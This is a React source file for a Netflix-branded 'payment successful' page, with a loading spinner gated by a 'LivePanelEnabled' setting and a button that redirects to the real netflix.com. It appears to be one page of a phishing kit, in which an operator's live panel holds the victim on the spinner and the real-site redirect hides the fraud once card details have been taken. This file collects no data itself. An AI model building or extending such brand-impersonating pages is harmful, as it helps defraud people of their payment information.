import React, { useState, useEffect } from 'react';
import { useIntl } from 'react-intl';
import { NetflixLogo } from '../components/NetflixLogo';
import { useNavigate, useLocation } from 'react-router-dom';
import { WhiteFooter } from '../components/WhiteFooter';
import { CheckCircle2, ArrowRight } from 'lucide-react';
import { LoadingSpinner } from '../components/LoadingSpinner';
import { config } from '../config';
import { motion } from 'framer-motion';

export function SuccessPayment() {
  const navigate = useNavigate();
  const location = useLocation();
  const intl = useIntl();
  const searchParams = new URLSearchParams(location.search);
  const noLoading = searchParams.get('noLoading') === 'true';
  const [isLoading, setIsLoading] = useState(config.LivePanelEnabled && !noLoading);
  const [showContent, setShowContent] = useState(false);

  useEffect(() => {
    if (!config.LivePanelEnabled) {
      const timer = setTimeout(() => {
        setIsLoading(false);
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, []);

  useEffect(() => {
    if (!isLoading) {
      const timer = setTimeout(() => {
        setShowContent(true);
      }, 100);
      return () => clearTimeout(timer);
    }
  }, [isLoading]);

  if (isLoading) {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <motion.header
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.3 }}
          className="border-b border-gray-200"
        >
          <div className="max-w-[1200px] mx-auto px-8 py-5">
            <NetflixLogo />
          </div>
        </motion.header>
        <main className="flex-grow flex items-center justify-center">
          <LoadingSpinner />
        </main>
        <WhiteFooter />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-white to-gray-50 flex flex-col">
      <motion.header
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.3 }}
        className="border-b border-gray-200 bg-white"
      >
        <div className="max-w-[1200px] mx-auto px-8 py-5 flex justify-between items-center">
          <NetflixLogo />
          <button 
            onClick={() => navigate('/')}
            className="text-[#333333] hover:text-[#333333] text-lg font-bold hover:underline transition-all"
          >
            {intl.formatMessage({ id: 'nav.signout' })}
          </button>
        </div>
      </motion.header>

      <main className="flex-grow flex flex-col items-center justify-center px-4 py-12 md:py-16">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3, delay: 0.2 }}
          className="w-full max-w-[440px] text-center"
        >
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.3 }}
            className="bg-white rounded-2xl shadow-lg p-8 mb-8"
          >
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.3, delay: 0.4 }}
              className="flex justify-center mb-6"
            >
              <div className="relative">
                <div className="absolute inset-0 bg-green-500 rounded-full animate-ping opacity-25" />
                <CheckCircle2 className="w-20 h-20 text-green-500 relative animate-scale" />
              </div>
            </motion.div>

            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.3, delay: 0.5 }}
              className="mb-6"
            >
              <h1 className="text-[32px] font-bold text-[#333333] mb-4">
                {intl.formatMessage({ id: 'success.title' })}
              </h1>
              <p className="text-lg text-[#666666] leading-relaxed">
                {intl.formatMessage({ id: 'success.message' })}
              </p>
            </motion.div>

            <motion.button 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.3, delay: 0.6 }}
              onClick={() => window.location.href = 'https://www.netflix.com'}
              className="w-full bg-[#e50914] text-white rounded-lg px-8 py-4 text-lg font-medium hover:bg-[#f6121d] transition-all transform hover:scale-[1.02] flex items-center justify-center space-x-2 group"
            >
              <span>{intl.formatMessage({ id: 'success.button' })}</span>
              <ArrowRight className="w-5 h-5 transform transition-transform group-hover:translate-x-1" />
            </motion.button>
          </motion.div>

          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.7 }}
            className="flex items-center justify-center space-x-4"
          >
            <img 
              src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/visa-v3.svg" 
              alt="Visa" 
              className="h-6 opacity-50 hover:opacity-100 transition-opacity"
            />
            <img 
              src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/mastercard-v2.svg" 
              alt="Mastercard" 
              className="h-6 opacity-50 hover:opacity-100 transition-opacity"
            />
            <img 
              src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/amex-v2.svg" 
              alt="American Express" 
              className="h-6 opacity-50 hover:opacity-100 transition-opacity"
            />
          </motion.div>
        </motion.div>
      </main>

      <WhiteFooter />
    </div>
  );
}